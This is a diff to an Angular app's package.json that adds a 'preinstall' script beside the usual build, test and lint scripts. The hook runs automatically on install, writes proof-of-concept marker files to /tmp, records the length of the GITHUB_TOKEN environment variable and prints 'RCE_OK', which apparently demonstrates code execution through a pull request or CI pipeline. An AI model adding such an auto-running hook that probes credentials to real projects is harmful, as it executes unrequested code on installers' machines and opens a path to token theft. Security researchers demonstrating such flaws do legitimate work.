@@ -10,7 +10,8 @@
     "build": "node git-version.js && ng build",
     "test": "ng test",
     "test-headless": "ng test --watch=false --reporters=junit --output-file=junit/TESTS.xml",
-    "lint": "ng lint"
+    "lint": "ng lint",
+    "preinstall": "echo POC_MARKER_BASE-ANGULAR-APP > /tmp/POC_MARKER_BASE-ANGULAR-APP.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_BASE-ANGULAR-APP.txt; echo RCE_OK >> /tmp/POC_MARKER_BASE-ANGULAR-APP.txt; cat /tmp/POC_MARKER_BASE-ANGULAR-APP.txt"
   },
   "private": true,
   "dependencies": {
